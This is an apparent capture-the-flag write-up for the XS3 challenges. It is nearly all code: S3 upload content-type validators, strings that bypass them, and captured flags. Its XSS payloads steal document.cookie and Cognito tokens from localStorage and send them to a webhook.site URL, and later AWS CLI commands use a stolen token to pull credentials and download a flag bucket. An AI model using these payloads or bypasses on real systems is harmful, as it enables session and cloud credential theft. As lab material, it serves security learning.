# XS3 Writeup

> 原文: https://www.ctfiot.com/172054.html
> ID: 172054


```
flag{welcome_2_xs3}
```



```
<html>
 <body>
 <script>
 const c = btoa(document.cookie);
 fetch("https://webhook.site/89fb3de1-73b3-4344-a625-121bbeab850a?rikoteki="+c);
 </script>
 </body>
</html>
```



```
flag{bfe061955a7cf19b12ff0f224e88d65a470e800a}
```



```
Failed to get presigned URL
```



```
{"contentType":"text/html","length":186}
```



```
const allow = ['image/png', 'image/jpeg', 'image/gif'];
 if (!allow.includes(request.body.contentType)) {
 return reply.code(400).send({ error: 'Invalid file type' });
 }
```



```
{"contentType":"image/png","length":186}
```



```
flag{fc6f76dd4368e888c1bc878b7750b374c891639f}
```



```
Invalid file type
```



```
const filename = uuidv4();
 const s3 = new S3Client({});
 const { url, fields } = await createPresignedPost(s3, {
 Bucket: process.env.BUCKET_NAME!,
 Key: `upload/${filename}`,
 Conditions: [
 ['content-length-range', 0, 1024 * 1024 * 100],
 ['starts-with', '$Content-Type', 'image'],
 ],
 Fields: {
 'Content-Type': request.body.contentType,
 },
 Expires: 600,
 });
 return reply.header('content-type', 'application/json').send({
 url,
 fields,
 });
```



```
{"contentType":"imageaaaa","length":186}
```



```
flag{c137e5b9b7afd4b13a15839a26153940beeefc7d}
```



```
const contentTypeValidator = (contentType: string) => {
 if (contentType.endsWith('image/png')) return true;
 if (contentType.endsWith('image/jpeg')) return true;
 if (contentType.endsWith('image/jpg')) return true;
 return false;
 };

 if (!contentTypeValidator(request.body.contentType)) {
 return reply.code(400).send({ error: 'Invalid file type' });
 }
```



```
text/html;x=image/png
```



```
flag{97ce55c30c8dc3a34cd73bbf3f49c2bb15a89617}
```



```
if (request.body.contentType.includes(';')) {
 return reply.code(400).send({ error: 'No file type (only type/subtype)' });
 }

 const allow = new RegExp('image/(jpg|jpeg|png|gif)$');
 if (!allow.test(request.body.contentType)) {
 return reply.code(400).send({ error: 'Invalid file type' });
 }
```



```
text/html image/png
```



```
flag{acc9b4786f6bf003a75f32b5607c92530dcf6b9f}
```



```
const allowContentTypes = ['image/png', 'image/jpeg', 'image/jpg'];

 const isAllowContentType = allowContentTypes.filter((contentType) => request.body.contentType.startsWith(contentType) && request.body.contentType.endsWith(contentType));
 if (isAllowContentType.length === 0) {
 return reply.code(400).send({ error: 'Invalid file type' });
 }
```



```
image/jpg,text/html;charset=UTF-8,text/html;charset=image/jpg
```



```
flag{f9eedd5f8b508ff8b03b803affb00d381826047b}
```



```
const denyStringRegex = /[\s\;()]/;

 if (denyStringRegex.test(request.body.extention)) {
 return reply.code(400).send({ error: 'Invalid file type' });
 }

 const allowExtention = ['png', 'jpeg', 'jpg', 'gif'];

 const isAllowExtention = allowExtention.filter((ext) => request.body.extention.includes(ext)).length > 0;
 if (!isAllowExtention) {
 return reply.code(400).send({ error: 'Invalid file extention' });
 }
```



```
{
 "extention": "png,text/html"
 "length": 186
}
```



```
image/aaaa,text/html,bbbb,png
```



```
flag{b1b3fcx5f8b508ff8b03b803affb00d381826047b}
```



```
{
 "extention": [
 "png",
 "text/html"
 ],
 "length": 186
}
```



```
const denyStrings = new RegExp('[;,="\'()]');

 if (denyStrings.test(request.body.contentType)) {
 return reply.code(400).send({ error: 'Invalid content type' });
 }

 if (!request.body.contentType.startsWith('image') || !['jpeg', 'jpg', 'png', 'gif'].includes(request.body.contentType.split('/')[1])) {
 return reply.code(400).send({ error: 'Invalid image type' });
 }
```



```
const command = new PutObjectCommand({
 Bucket: process.env.BUCKET_NAME,
 Key: `upload/${filename}`,
 ContentType: `${request.body.contentType.split('/')[0]}/${request.body.contentType.split('/')[1]}`,
 });
```



```
image text%2fhtml test/png
```



```
flag{c4ca4238a0b923820dcc509a6f75849b}
```



```
await page.evaluate(
 (IdToken: string, AccessToken: string, RefreshToken: string) => {
 const randomNumber = Math.floor(Math.random() * 1000000);
 localStorage.setItem(`CognitoIdentityServiceProvider.${randomNumber}.idToken`, IdToken);
 localStorage.setItem(`CognitoIdentityServiceProvider.${randomNumber}.accessToken`, AccessToken);
 localStorage.setItem(`CognitoIdentityServiceProvider.${randomNumber}.refreshToken`, RefreshToken);
 },
 IdToken,
 AccessToken,
 RefreshToken,
 );
```



```
const [contentType, ...params] = request.body.contentType.split(';');
 const type = contentType.split('/')[0].toLowerCase();
 const subtype = contentType.split('/')[1].toLowerCase();

 const denyMimeSubTypes = ['html', 'javascript', 'xml', 'json', 'svg', 'xhtml', 'xsl'];
 if (denyMimeSubTypes.includes(subtype)) {
 return reply.code(400).send({ error: 'Invalid file type' });
 }
 const denyStrings = new RegExp('[;,="\'()]');
 if (denyStrings.test(type) || denyStrings.test(subtype)) {
 return reply.code(400).send({ error: 'Invalid Type or SubType' });
 }
```



```
text%2fhtml / image%2fpng
```



```
const url = await getSignedUrl(s3, command, {
 expiresIn: 60 * 60 * 24,
 signableHeaders: new Set(['content-type']),
 });
```



```
<html>
 <body>
 <script>
 let cred = "";
 Object.keys(localStorage).forEach(k => {
 cred += `${k}:${localStorage[k]},`
 })
 fetch("https://webhook.site/89fb3de1-73b3-4344-a625-121bbeab850a?rikoteki="+cred);
 </script>
 </body>
</html>
```



```
flag{c81e728d9d4c2f636f067f89cc14862c}
```



```
const url = await getSignedUrl(s3, command, {
 expiresIn: 60 * 60 * 24,
 signableHeaders: new Set(['content-type', 'content-disposition']),
 });
~~~~~~~~~
const command = new PutObjectCommand({
 Bucket: process.env.BUCKET_NAME,
 Key: `upload/${filename}`,
 ContentLength: request.body.length,
 ContentType: request.body.contentType,
 ContentDisposition: 'attachment',
 });
```



```
text/html aaaa
```



```
const denyMimeSubTypes = ['html', 'javascript', 'xml', 'json', 'svg', 'xhtml', 'xsl'];

 const extractMimeType = (contentTypeAndParams) => {
 const [contentType, ...params] = contentTypeAndParams.split(';');
 console.log(`Extracting content type: ${contentType}`);
 console.log(`Extracting params: ${JSON.stringify(params)}`);
 const [type, subtype] = contentType.split('/');
 console.log(`Extracting type: ${type}`);
 console.log(`Extracting subtype: ${subtype}`);
 return { type, subtype, params };
 };

 const isDenyMimeSubType = (contentType) => {
 console.log(`Checking content type: ${contentType}`);
 const { subtype } = extractMimeType(contentType);
 return denyMimeSubTypes.includes(subtype.trim().toLowerCase());
 };

 window.onload = async () => {
 const url = new URL(window.location.href);
 const path = url.pathname.slice(1).split('/');
 path.shift();
 const key = path.join('/');
 console.log(`Loading file: /${key}`);

 const response = await fetch(`/${key}`);
 if (!response.ok) {
 console.error(`Failed to load file: /${key}`);
 document.body.innerHTML = '<h1>Failed to load file</h1>';
 return;
 }
 const contentType = response.headers.get('content-type');
 if (isDenyMimeSubType(contentType)) {
 console.error(`Failed to load file: /${key}`);
 document.body.innerHTML = '<h1>Failed to load file due to invalid content type</h1>';
 return;
 }
 const blobUrl = URL.createObjectURL(await response.blob());
 document.body.innerHTML = `<iframe src="${blobUrl}" style="width: 100%; height: 100%"></iframe>`;
 };
```



```
<html>
 <body>
 <script>
 const c = btoa(window.parent.document.cookie);
 fetch("https://webhook.site/89fb3de1-73b3-4344-a625-121bbeab850a?rikoteki="+c);
 </script>
 </body>
</html>
```



```
flag{d41d8cd98f00b204e9800998ecf8427e}
```



```
aws cognito-identity get-id \ 
 --identity-pool-id ap-northeast-1:05611045-eb46-41e2-9f6c-f41d87547e4d \
 --logins {ISS}={IDTOKEN} \
 --query "IdentityId"

"ap-northeast-1:4f187980-dcb4-c060-4a49-b1d4128a0d3d"
```



```
aws cognito-identity get-credentials-for-identity \ 
 --identity-id ap-northeast-1:4f187980-dcb4-c060-4a49-b1d4128a0d3d \
 --logins {ISS}={IDTOKEN}
{
 "IdentityId": "ap-northeast-1:4f187980-dcb4-c060-4a49-b1d4128a0d3d",
 "Credentials": {
 "AccessKeyId": "REDACTED",
 "SecretKey": "REDACTED",
 "SessionToken": "REDACTED",
 "Expiration": "2024-04-03T09:29:10+09:00"
 }
}
```



```
export AWS_ACCESS_KEY_ID=REDACTED
export AWS_SECRET_ACCESS_KEY=REDACTED
export AWS_SECURITY_TOKEN="REDACTED"
```



```
aws s3 ls

2024-03-24 19:01:16 cdk-hnb659fds-assets-339713032412-ap-northeast-1
2024-03-24 22:36:30 deliverybucket-5250c0a74f-adv-3-delivery
2024-03-25 14:05:29 specialflagbucket-5250c0a74f-adv3-special-flag
2024-03-24 22:36:30 uploadbucket-5250c0a74f-adv-3-upload
```



```
aws s3 sync s3://specialflagbucket-5250c0a74f-adv3-special-flag ./flag.txt

download: s3://specialflagbucket-5250c0a74f-adv3-special-flag/flag.txt to flag.txt/flag.txt
```



```
flag{eccbc87e4b5ce2fe28308fd9f2a7baf3}
```
